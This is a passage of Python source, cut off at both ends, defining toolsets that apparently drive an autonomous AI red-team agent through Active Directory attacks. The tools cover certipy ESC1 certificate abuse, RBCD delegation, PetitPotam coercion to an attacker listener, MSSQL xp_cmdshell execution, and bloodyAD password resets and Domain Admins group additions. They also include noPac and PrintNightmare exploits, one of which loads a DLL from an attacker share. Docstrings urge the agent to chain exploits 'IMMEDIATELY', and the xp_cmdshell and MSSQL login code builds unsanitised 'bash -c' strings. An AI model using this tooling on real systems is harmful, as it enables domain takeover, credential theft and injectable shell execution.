        # Generate recommended actions
        for template in result["vulnerable_templates"]:
            if "ESC1" in template["vulnerabilities"]:
                result["exploitable"] = True
                result["recommended_actions"].append(
                    {
                        "action": "certipy_req_esc1",
                        "priority": "CRITICAL",
                        "template_name": template["name"],
                        "ca_name": template["ca"],
                        "description": f"ESC1 on template '{template['name']}' - Request certificate as Administrator",
                        "next_tool": "certipy_req_esc1",
                        "parameters": {
                            "ca_name": template["ca"],
                            "template_name": template["name"],
                            "target_upn": f"administrator@{self.state.target.domain if self.state else 'DOMAIN'}",
                        },
                    }
                )
            elif any(
                esc in template["vulnerabilities"] for esc in ["ESC2", "ESC3", "ESC4", "ESC6"]
            ):
                result["exploitable"] = True
                result["recommended_actions"].append(
                    {
                        "action": "investigate_esc",
                        "priority": "HIGH",
                        "template_name": template["name"],
                        "ca_name": template["ca"],
                        "vulnerabilities": template["vulnerabilities"],
                        "description": f"Investigate {', '.join(template['vulnerabilities'])} on template '{template['name']}'",
                    }
                )

        return result

    @dn.tool_method
    def certipy_find(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Enumerate ADCS for vulnerable certificate templates (ESC1-15).

        ADCS misconfigurations enable privilege escalation to Domain Admin:
        - ESC1: Request cert as any user (including Domain Admin)
        - ESC2/3: Any Purpose EKU or Certificate Request Agent
        - ESC4: Vulnerable template ACLs
        - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
        - ESC8: NTLM relay to web enrollment

        This tool returns STRUCTURED OUTPUT with actionable exploitation parameters.
        If ESC1 is found, IMMEDIATELY use certipy_req_esc1 with the provided parameters.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP address

        Returns:
            Structured JSON with:
            - vulnerable_templates: List of templates with ESC vulnerabilities
            - exploitable: Boolean indicating if direct exploitation is possible
            - recommended_actions: Specific next steps with tool parameters
            - certificate_authorities: List of discovered CAs

        Example:
            >>> certipy_find("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
            # If ESC1 found, output includes:
            # "recommended_actions": [{"action": "certipy_req_esc1", "parameters": {...}}]
        """
        cmd = [
            "certipy",
            "find",
            "-u",
            f"{username}@{domain}",
            "-p",
            password,
            "-dc-ip",
            dc_ip,
            "-vulnerable",
            "-stdout",
        ]

        try:
            logger.info(f"[*] Enumerating ADCS for {domain}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=300)

            raw_output = stdout + "\n" + (stderr or "")

            # Parse output into structured format
            parsed = self._parse_certipy_output(raw_output)

            if parsed["exploitable"]:
                logger.warning(
                    "[!] VULNERABLE CERTIFICATE TEMPLATES FOUND - EXPLOITATION POSSIBLE!"
                )
                logger.warning(f"[!] Recommended actions: {len(parsed['recommended_actions'])}")

            # Return structured JSON for agent to parse
            output_parts = []
            output_parts.append("=" * 60)
            output_parts.append("CERTIPY ADCS ENUMERATION RESULTS")
            output_parts.append("=" * 60)

            if parsed["exploitable"]:
                output_parts.append("\n🚨 CRITICAL: EXPLOITABLE VULNERABILITIES FOUND!")
                output_parts.append("\n📋 RECOMMENDED ACTIONS (Execute in order):")
                for i, action in enumerate(parsed["recommended_actions"], 1):
                    output_parts.append(f"\n  {i}. [{action['priority']}] {action['description']}")
                    if action.get("next_tool"):
                        output_parts.append(f"     → Use tool: {action['next_tool']}")
                    if action.get("parameters"):
                        output_parts.append(
                            f"     → Parameters: {json.dumps(action['parameters'], indent=8)}"
                        )

            output_parts.append("\n\n📊 STRUCTURED DATA (JSON):")
            output_parts.append(
                json.dumps(
                    {
                        "exploitable": parsed["exploitable"],
                        "vulnerable_templates": parsed["vulnerable_templates"],
                        "certificate_authorities": parsed["certificate_authorities"],
                        "recommended_actions": parsed["recommended_actions"],
                    },
                    indent=2,
                )
            )

            output_parts.append("\n\n📄 RAW OUTPUT:")
            output_parts.append(raw_output)

            return "\n".join(output_parts)

        except Exception as e:
            return f"Certipy enumeration failed: {e}"

    @dn.tool_method
    def certipy_req_esc1(
        self,
        domain: str,
        username: str,
        password: str,
        ca_name: str,
        template_name: str,
        target_upn: str,
        dc_ip: str,
    ) -> str:
        """
        Exploit ESC1 to request certificate for any user (Domain Admin path).

        ESC1 allows requesting certs for ANY user when template has
        "Enrollee Supplies Subject". Direct path to Domain Admin.

        After obtaining cert, use certipy_auth to get NTLM hash.

        Args:
            domain: Target domain
            username: Your compromised username
            password: Password for authentication
            ca_name: CA name from certipy_find
            template_name: Vulnerable template name
            target_upn: Target UPN (e.g., 'administrator@sevenkingdoms.local')
            dc_ip: Domain controller IP

        Returns:
            Certificate PFX file path

        Example:
            >>> certipy_req_esc1("sevenkingdoms.local", "user", "pass", "CA-NAME", "ESC1Template", "administrator@sevenkingdoms.local", "192.168.56.10")
        """
        cmd = [
            "certipy",
            "req",
            "-u",
            f"{username}@{domain}",
            "-p",
            password,
            "-dc-ip",
            dc_ip,
            "-ca",
            ca_name,
            "-template",
            template_name,
            "-upn",
            target_upn,
        ]

        try:
            logger.info(f"[*] Requesting certificate for {target_upn} via ESC1")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            if "saved" in stdout.lower():
                logger.info("[+] Certificate obtained! Use certipy_auth next.")

            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"Certificate request failed: {e}"

    @dn.tool_method
    def certipy_auth(self, pfx_path: str, dc_ip: str) -> str:
        """
        Authenticate with certificate to obtain NTLM hash.

        Use after certipy_req_esc1 to get the target user's NTLM hash.
        IMMEDIATELY use the hash with domain_admin_checker.

        Args:
            pfx_path: Path to PFX certificate file
            dc_ip: Domain controller IP address

        Returns:
            NTLM hash for the authenticated user

        Example:
            >>> certipy_auth("administrator.pfx", "192.168.56.10")
        """
        cmd = ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", dc_ip]

        try:
            logger.info("[*] Authenticating with certificate")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)

            if "hash" in stdout.lower():
                logger.info("[+] NTLM hash obtained! Run domain_admin_checker.")

            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"Certificate authentication failed: {e}"


class DelegationTools(Toolset):
    """Tools for Kerberos delegation attacks (RBCD, unconstrained, constrained)."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def find_delegation(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Find accounts with delegation enabled.

        Delegation enables privilege escalation:
        - Unconstrained: Capture TGTs from connecting users (DC compromise)
        - Constrained: Impersonate users to specific services
        - RBCD: Attacker-controlled delegation (requires GenericWrite)

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP address

        Returns:
            List of accounts with delegation

        Example:
            >>> find_delegation("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
        """
        cmd = [
            "impacket-findDelegation",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Searching for delegation in {domain}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
            return stdout or stderr
        except Exception as e:
            return f"Delegation search failed: {e}"

    @dn.tool_method
    def add_computer(
        self,
        domain: str,
        username: str,
        password: str,
        computer_name: str,
        computer_password: str,
        dc_ip: str,
    ) -> str:
        """
        Add computer account (requires MAQ > 0, default is 10).

        Computer accounts required for RBCD attacks.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            computer_name: Name for new computer (without $)
            computer_password: Password for the computer account
            dc_ip: Domain controller IP

        Returns:
            Status of computer account creation

        Example:
            >>> add_computer("sevenkingdoms.local", "user", "pass", "EVILPC", "P@ss123!", "192.168.56.10")
        """
        cmd = [
            "impacket-addcomputer",
            f"{domain}/{username}:{password}",
            "-computer-name",
            computer_name,
            "-computer-pass",
            computer_password,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Adding computer account {computer_name}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
            logger.info(f"[+] Computer account {computer_name}$ created")
            return stdout or stderr
        except Exception as e:
            return f"Computer account creation failed: {e}"

    @dn.tool_method
    def rbcd_write(
        self,
        domain: str,
        username: str,
        password: str,
        delegate_from: str,
        delegate_to: str,
        dc_ip: str,
    ) -> str:
        """
        Configure RBCD for privilege escalation.

        Attack chain: add_computer -> rbcd_write -> get_st -> secretsdump

        Args:
            domain: Target domain
            username: Username with GenericWrite on target
            password: Password for authentication
            delegate_from: Your controlled computer (with $)
            delegate_to: Target computer (with $)
            dc_ip: Domain controller IP

        Returns:
            Status of RBCD configuration

        Example:
            >>> rbcd_write("sevenkingdoms.local", "user", "pass", "EVILPC$", "DC01$", "192.168.56.10")
        """
        cmd = [
            "impacket-rbcd",
            "-delegate-from",
            delegate_from,
            "-delegate-to",
            delegate_to,
            "-action",
            "write",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Configuring RBCD: {delegate_from} -> {delegate_to}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
            logger.info("[+] RBCD configured - use get_st next")
            return stdout or stderr
        except Exception as e:
            return f"RBCD configuration failed: {e}"

    @dn.tool_method
    def get_st(
        self,
        domain: str,
        computer_name: str,
        computer_password: str,
        target_spn: str,
        impersonate_user: str,
        dc_ip: str,
    ) -> str:
        """
        Request service ticket while impersonating user (after RBCD).

        After rbcd_write, get ticket as Administrator for target service.

        Args:
            domain: Target domain
            computer_name: Your controlled computer (with $)
            computer_password: Computer password
            target_spn: Target SPN (e.g., 'cifs/dc01.sevenkingdoms.local')
            impersonate_user: User to impersonate ('Administrator')
            dc_ip: Domain controller IP

        Returns:
            Service ticket saved as .ccache - use with KRB5CCNAME

        Example:
            >>> get_st("sevenkingdoms.local", "EVILPC$", "P@ss!", "cifs/dc01.sevenkingdoms.local", "Administrator", "192.168.56.10")
        """
        cmd = [
            "impacket-getST",
            "-spn",
            target_spn,
            "-impersonate",
            impersonate_user,
            "-dc-ip",
            dc_ip,
            f"{domain}/{computer_name}:{computer_password}",
        ]

        try:
            logger.info(f"[*] Requesting ST for {target_spn} as {impersonate_user}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            if ".ccache" in stdout:
                logger.info("[+] Ticket obtained! Export KRB5CCNAME and use secretsdump -k")

            return stdout or stderr
        except Exception as e:
            return f"Service ticket request failed: {e}"


class RedTeamReportingTools(Toolset):
    """Tools for recording findings and building the operation report."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def record_finding(
        self,
        finding_type: str,
        data: dict[str, Any],
    ) -> str:
        """
        Record a discovery during the red team operation.

        Use this tool to report EVERY significant finding:
        - Users discovered
        - Credentials (username:password pairs)
        - NTLM hashes
        - Kerberos hashes
        - Network shares
        - Cracked passwords
        - Administrative access (Pwn3d!)
        - Domain admin discovery
        - Golden ticket success

        Args:
            finding_type: Type of finding - one of:
                "host", "user", "credential", "hash", "share",
                "admin_access", "domain_admin", "golden_ticket"
            data: Dictionary containing the finding data. Required fields per type:
                - host: {"ip": str, "hostname": str, "os": str, "roles": list, "services": list}
                - user: {"username": str, "domain": str, "description": str, "is_admin": bool}
                - credential: {"username": str, "password": str, "domain": str, "source": str, "is_admin": bool}
                - hash: {"username": str, "hash_value": str, "hash_type": str, "domain": str, "cracked_password": str}
                - share: {"host": str, "name": str, "permissions": str, "comment": str}
                - admin_access: {"details": str}

        Returns:
            Confirmation message

        Example:
            >>> record_finding("credential", {
            ...     "username": "administrator",
            ...     "password": "P@ssw0rd",  # pragma: allowlist secret
            ...     "domain": "EXAMPLE",
            ...     "source": "secretsdump",
            ...     "is_admin": True
            ... })
            >>> record_finding("hash", {
            ...     "username": "Administrator",
            ...     "hash_value": "aad3b435b51404ee...",
            ...     "hash_type": "NTLM",
            ...     "domain": "EXAMPLE"
            ... })
            >>> record_finding("share", {
            ...     "host": "192.168.1.100",
            ...     "name": "SYSVOL",
            ...     "permissions": "READ",
            ...     "comment": "Logon server share"
            ... })
        """
        if not self.state:
            return "[!] Error: No operation state available"

        try:
            if finding_type == "host":
                host = Host(
                    ip=data["ip"],
                    hostname=data.get("hostname", "Unknown"),
                    os=data.get("os", "Unknown"),
                    roles=data.get(
                        "roles", data.get("host_type", "").split() if data.get("host_type") else []
                    ),
                    services=data.get("services", []),
                )
                self.state.hosts.append(host)
                logger.info(f"[+] Recorded host: {host.hostname} ({host.ip})")
                return f"✓ Recorded host: {host.hostname} ({host.ip})"

            if finding_type == "user":
                user = User(
                    username=data["username"],
                    domain=data.get("domain", ""),
                    description=data.get("description", ""),
                    is_admin=data.get("is_admin", False),
                )
                self.state.users.append(user)
                logger.info(f"[+] Recorded user: {user.username}@{user.domain}")
                return f"✓ Recorded user: {user.username}@{user.domain}"

            if finding_type == "credential":
                cred = Credential(
                    username=data.get("username", "Unknown"),
                    password=data.get("password", ""),
                    domain=data.get("domain", ""),
                    source=data.get("source", "unknown"),
                    is_admin=data.get("is_admin", False),
                )
                self.state.credentials.append(cred)

                # Track tested credentials
                cred_key = self.state.get_credential_key(cred.username, cred.password, cred.domain)
                self.state.tested_credentials.add(cred_key)

                logger.info(f"[+] Recorded credential: {cred.username}@{cred.domain}")
                return f"✓ Recorded credential: {cred.username}@{cred.domain}"

            if finding_type == "hash":
                hash_obj = Hash(
                    username=data.get("username", "Unknown"),
                    hash_value=data["hash_value"],
                    hash_type=data.get("hash_type", "NTLM"),
                    domain=data.get("domain", ""),
                    cracked_password=data.get("cracked_password", ""),
                )
                self.state.hashes.append(hash_obj)
                logger.info(f"[+] Recorded hash for: {hash_obj.username}")
                return f"✓ Recorded hash for: {hash_obj.username}"

            if finding_type == "share":
                share = Share(
                    host=data.get("host_ip", data.get("host", "")),
                    name=data.get("share_name", data.get("name", "")),
                    permissions=data.get("permissions", ""),
                    comment=data.get("comment", data.get("description", "")),
                )
                self.state.shares.append(share)
                logger.info(f"[+] Recorded share: {share.name} on {share.host}")
                return f"✓ Recorded share: {share.name} on {share.host}"

            if finding_type == "admin_access":
                details = data.get("details", "")

                # Validate that this is actually a success, not an error being misreported
                error_indicators = [
                    "not found",
                    "not available",
                    "not installed",
                    "not in path",
                    "missing",
                    "failed",
                    "error",
                    "cannot",
                    "unable",
                    "timed out",
                    "timeout",
                    "not properly configured",
                    "command not found",
                    "no such file",
                    "permission denied",
                ]
                details_lower = details.lower()

                for indicator in error_indicators:
                    if indicator in details_lower:
                        logger.warning(
                            f"[!] Rejecting admin_access finding - details contain error indicator '{indicator}': {details[:200]}"
                        )
                        return (
                            f"[!] REJECTED: Cannot record admin_access with error details. "
                            f"The details contain '{indicator}' which indicates a failure, not success. "
                            f"Only call record_finding('admin_access') when you have CONFIRMED admin access "
                            f"(e.g., 'Pwn3d!' in netexec output, successful secretsdump, etc.). "
                            f"If tools are missing or not working, troubleshoot the environment first."
                        )

                # Require some positive indicator of success
                success_indicators = [
                    "pwn3d",
                    "admin",
                    "success",
                    "authenticated",
                    "dumped",
                    "obtained",
                ]
                has_success_indicator = any(ind in details_lower for ind in success_indicators)

                if not has_success_indicator and len(details) > 0:
                    logger.warning(
                        f"[!] Admin access claim lacks success indicators: {details[:200]}"
                    )
                    return (
                        "[!] REJECTED: admin_access finding should include evidence of success "
                        "(e.g., 'Pwn3d!' output, successful authentication, dumped credentials). "
                        "Provide specific details showing HOW admin access was confirmed."
                    )

                self.state.has_domain_admin = True
                event = TimelineEvent(
                    id=f"evt-{len(self.state.timeline):04d}",
                    timestamp=datetime.now(timezone.utc),
                    description=f"Domain admin access achieved: {details}",
                    mitre_techniques=["T1078.002"],  # Domain Accounts
                    confidence=1.0,
                    source="domain_admin_checker",
                )
                self.state.timeline.append(event)
                logger.info("[+] CRITICAL: Domain admin access recorded!")
                return "✓ CRITICAL: Domain admin access recorded!"

            return f"[!] Unknown finding type: {finding_type}"

        except Exception as e:
            logger.error(f"[!] Error recording finding: {e}")
            return f"[!] Error recording finding: {e}"


class CoercionTools(Toolset):
    """Tools for authentication coercion attacks (PetitPotam, Coercer).

    These tools trigger authentication from target machines to an attacker-controlled
    listener, enabling relay attacks or TGT capture with unconstrained delegation.
    """

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def petitpotam(
        self,
        target: str,
        listener: str,
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
    ) -> str:
        """
        Coerce authentication from target via MS-EFSRPC (PetitPotam).

        PetitPotam abuses the MS-EFSRPC protocol to force a target machine
        to authenticate to an attacker-controlled listener. Use this with:
        - Unconstrained delegation: Capture TGT from coerced DC
        - NTLM relay: Relay authentication to LDAPS/HTTP for RBCD or shadow creds
        - ESC8: Relay to ADCS web enrollment

        CRITICAL: Use when find_delegation shows unconstrained delegation.

        Args:
            target: Target machine to coerce (usually DC IP)
            listener: Attacker listener IP (where to send the auth)
            username: Optional username for authenticated coercion
            password: Optional password for authentication
            domain: Optional domain for authentication
            dc_ip: Optional DC IP for Kerberos auth

        Returns:
            Coercion attempt result

        Example:
            >>> petitpotam("192.168.56.10", "192.168.56.100")  # Unauthenticated
            >>> petitpotam("192.168.56.10", "192.168.56.100", "user", "pass", "domain.local")
        """
        cmd = ["petitpotam.py", listener, target]

        if username and password:
            cmd.extend(["-u", username, "-p", password])
            if domain:
                cmd.extend(["-d", domain])
            if dc_ip:
                cmd.extend(["-dc-ip", dc_ip])

        try:
            logger.info(f"[*] Coercing authentication from {target} to {listener}")
            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")
            if returncode == 0 or "successfully" in result.lower():
                logger.info("[+] PetitPotam coercion successful!")
            else:
                logger.warning(f"[!] PetitPotam may have failed: {result[:200]}")

            return result

        except Exception as e:
            return f"PetitPotam failed: {e}"

    @dn.tool_method
    def coercer(
        self,
        target: str,
        listener: str,
        username: str,
        password: str,
        domain: str,
        dc_ip: str | None = None,
    ) -> str:
        """
        Coerce authentication via multiple protocols (Coercer).

        Coercer tries multiple coercion methods (MS-EFSRPC, MS-RPRN, MS-DFSNM, etc.)
        to find one that works. More comprehensive than PetitPotam alone.

        Use when PetitPotam fails or when you want to try all available methods.

        Args:
            target: Target machine to coerce
            listener: Attacker listener IP
            username: Username for authenticated coercion
            password: Password for authentication
            domain: Domain for authentication
            dc_ip: Optional DC IP for Kerberos

        Returns:
            Coercion results showing which methods succeeded

        Example:
            >>> coercer("192.168.56.10", "192.168.56.100", "user", "pass", "domain.local")
        """
        cmd = [
            "coercer",
            "coerce",
            "-t",
            target,
            "-l",
            listener,
            "-u",
            username,
            "-p",
            password,
            "-d",
            domain,
        ]

        if dc_ip:
            cmd.extend(["--dc-ip", dc_ip])

        try:
            logger.info(f"[*] Running Coercer against {target}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")
            if "success" in result.lower() or "triggered" in result.lower():
                logger.info("[+] Coercion method succeeded!")

            return result

        except Exception as e:
            return f"Coercer failed: {e}"


class MSSQLTools(Toolset):
    """Tools for Microsoft SQL Server exploitation.

    MSSQL attacks can lead to code execution via xp_cmdshell and
    privilege escalation via impersonation chains.
    """

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def mssql_login(
        self,
        target: str,
        username: str,
        password: str,
        domain: str | None = None,
        windows_auth: bool = True,
        port: int = 1433,
    ) -> str:
        """
        Test MSSQL authentication and enumerate database access.

        Use this to verify SQL access and check for impersonation opportunities.
        Look for 'sa' impersonation which enables xp_cmdshell.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication (default: True)
            port: MSSQL port (default: 1433)

        Returns:
            Login result and database enumeration

        Example:
            >>> mssql_login("192.168.56.22", "samwell.tarly", "Heartsbane", "north.sevenkingdoms.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        cmd = ["mssqlclient.py", target_string, "-port", str(port)]

        if windows_auth:
            cmd.append("-windows-auth")

        # Add command to enumerate and exit
        cmd.extend(["-no-pass" if not password else ""])

        # Run with a simple query to test access
        try:
            logger.info(f"[*] Testing MSSQL login to {target}")
            # Use a simple enumeration command - SQL is intentional for pentest tool
            # nosec B608 - intentional SQL for MSSQL pentest enumeration
            sql_query = "SELECT name FROM master.sys.databases; SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
            enum_cmd = f"echo '{sql_query}' | mssqlclient.py {target_string}"
            if windows_auth:
                enum_cmd += " -windows-auth"

            stdout, stderr, _ = _run_tool(["bash", "-c", enum_cmd], timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")
            if "impersonate" in result.lower() or "control server" in result.lower():
                logger.warning("[!] IMPERSONATION or CONTROL SERVER permission found!")
                result = "🚨 IMPERSONATION POSSIBLE - Use mssql_impersonate next!\n\n" + result

            return result

        except Exception as e:
            return f"MSSQL login failed: {e}"

    @dn.tool_method
    def mssql_xp_cmdshell(
        self,
        target: str,
        username: str,
        password: str,
        command: str,
        domain: str | None = None,
        windows_auth: bool = True,
        impersonate: str | None = None,
    ) -> str:
        """
        Execute OS command via MSSQL xp_cmdshell.

        Enables xp_cmdshell if disabled and executes the specified command.
        Use after confirming sysadmin or impersonation access.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            command: OS command to execute (e.g., "whoami", "type c:\\users\\...")
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication
            impersonate: Login to impersonate (e.g., "sa") before executing

        Returns:
            Command output

        Example:
            >>> mssql_xp_cmdshell("192.168.56.22", "user", "pass", "whoami", "domain.local", impersonate="sa")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # Build the SQL commands
        sql_commands = []
        if impersonate:
            sql_commands.append(f"EXECUTE AS LOGIN = '{impersonate}';")
        sql_commands.append("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
        sql_commands.append("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
        sql_commands.append(f"EXEC xp_cmdshell '{command}';")

        sql_script = " ".join(sql_commands)

        cmd_string = f'echo "{sql_script}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Executing xp_cmdshell on {target}: {command}")
            stdout, stderr, _ = _run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")
            logger.info("[+] xp_cmdshell result received")

            return result

        except Exception as e:
            return f"xp_cmdshell failed: {e}"


class ACLExploitTools(Toolset):
    """Tools for exploiting Active Directory ACL misconfigurations.

    When BloodHound identifies GenericAll, GenericWrite, WriteDacl, or WriteOwner
    permissions, use these tools to exploit them.
    """

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def pywhisker(
        self,
        target_samaccountname: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "add",
    ) -> str:
        """
        Add/remove shadow credentials for privilege escalation.

        Shadow credentials abuse msDS-KeyCredentialLink to add attacker-controlled
        keys, enabling PKINIT authentication without knowing the password.

        Use when you have GenericAll or GenericWrite on a user/computer.

        Args:
            target_samaccountname: Target account to add shadow creds to
            domain: Target domain
            username: Your username with GenericAll/GenericWrite
            password: Your password
            dc_ip: Domain controller IP
            action: "add" to add shadow creds, "list" to view, "remove" to clean up

        Returns:
            Shadow credentials result (includes PFX path if successful)

        Example:
            >>> pywhisker("Administrator", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "pywhisker.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--target",
            target_samaccountname,
            "--action",
            action,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Running pywhisker against {target_samaccountname} ({action})")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result.lower() or "saved" in result.lower():
                logger.info("[+] Shadow credentials added! Use certipy_auth with the PFX file.")
                result = (
                    "🚨 SHADOW CREDENTIALS ADDED!\n"
                    "→ Use certipy_auth with the generated PFX file to get NTLM hash\n\n" + result
                )

            return result

        except Exception as e:
            return f"Pywhisker failed: {e}"

    @dn.tool_method
    def bloodyad_add_group_member(
        self,
        target_user: str,
        group: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Add a user to a group via ACL abuse (bloodyAD).

        Use when you have GenericAll, GenericWrite, or WriteMember on a group.
        Add yourself or a controlled user to Domain Admins or other privileged groups.

        Args:
            target_user: User to add to the group
            group: Target group (e.g., "Domain Admins")
            domain: Target domain
            username: Your username with write access
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Group modification result

        Example:
            >>> bloodyad_add_group_member("controlled_user", "Domain Admins", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "add",
            "groupMember",
            group,
            target_user,
        ]

        try:
            logger.info(f"[*] Adding {target_user} to {group} via bloodyAD")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "added" in result.lower():
                logger.info(f"[+] Successfully added {target_user} to {group}!")
                result = f"✅ {target_user} added to {group}!\n" + result

            return result

        except Exception as e:
            return f"bloodyAD failed: {e}"

    @dn.tool_method
    def bloodyad_set_password(
        self,
        target_user: str,
        new_password: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Reset a user's password via ACL abuse (bloodyAD).

        Use when you have GenericAll, GenericWrite, or ForceChangePassword on a user.
        Allows setting a known password without knowing the original.

        Args:
            target_user: User whose password to reset
            new_password: New password to set
            domain: Target domain
            username: Your username with write access
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Password reset result

        Example:
            >>> bloodyad_set_password("admin_user", "NewP@ssw0rd!", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "set",
            "password",
            target_user,
            new_password,
        ]

        try:
            logger.info(f"[*] Resetting password for {target_user} via bloodyAD")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "changed" in result.lower():
                logger.info(f"[+] Password for {target_user} reset successfully!")
                result = (
                    f"✅ Password reset for {target_user}!\n"
                    f"→ New credential: {target_user}:{new_password}\n"
                    f"→ Use domain_admin_checker with new creds\n\n" + result
                )

            return result

        except Exception as e:
            return f"bloodyAD failed: {e}"


class CVEExploitTools(Toolset):
    """Tools for exploiting known CVE vulnerabilities.

    These tools target specific unpatched vulnerabilities that can
    lead to privilege escalation or code execution.
    """

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def nopac(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        dc_host: str,
        target_user: str = "Administrator",
        shell: bool = False,
    ) -> str:
        """
        Exploit CVE-2021-42287/42278 (sAMAccountName spoofing / noPac).

        This vulnerability allows any domain user to impersonate the Domain Controller
        machine account and obtain a TGT as a domain admin.

        CRITICAL: Use when other paths fail. Works on unpatched DCs (pre-Nov 2021).

        Args:
            domain: Target domain
            username: Any valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            dc_host: Domain controller hostname (e.g., "DC01")
            target_user: User to impersonate (default: Administrator)
            shell: If True, attempt to get an interactive shell

        Returns:
            Exploitation result (includes ticket if successful)

        Example:
            >>> nopac("domain.local", "user", "pass", "192.168.56.10", "DC01")
        """
        cmd = [
            "noPac.py",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-dc-host",
            dc_host,
            "--impersonate",
            target_user,
        ]

        if shell:
            cmd.append("-shell")
        else:
            cmd.append("-dump")  # Dump hashes instead of shell

        try:
            logger.info(f"[*] Exploiting noPac against {dc_host}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)

            result = stdout + "\n" + (stderr or "")

            if "admin" in result.lower() or ".ccache" in result or "hash" in result.lower():
                logger.info("[+] noPac exploitation successful!")
                result = (
                    "🚨 noPac EXPLOITATION SUCCESSFUL!\n"
                    "→ Check output for Administrator hash or ticket\n"
                    "→ Use secretsdump with obtained credentials\n\n" + result
                )

            return result

        except Exception as e:
            return f"noPac failed: {e}"

    @dn.tool_method
    def printnightmare(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        dll_path: str,
    ) -> str:
        """
        Exploit CVE-2021-1675 (PrintNightmare) for local privilege escalation.

        PrintNightmare allows authenticated users to execute arbitrary DLLs as SYSTEM
        via the Windows Print Spooler service.

        Args:
            target: Target machine IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication
            dll_path: UNC path to malicious DLL (must be accessible from target)

        Returns:
            Exploitation result

        Example:
            >>> printnightmare("192.168.56.22", "user", "pass", "domain.local", "\\\\attacker\\share\\rev.dll")
        """
        cmd = [
            "CVE-2021-1675.py",
            f"{domain}/{username}:{password}@{target}",
            dll_path,
        ]

        try:
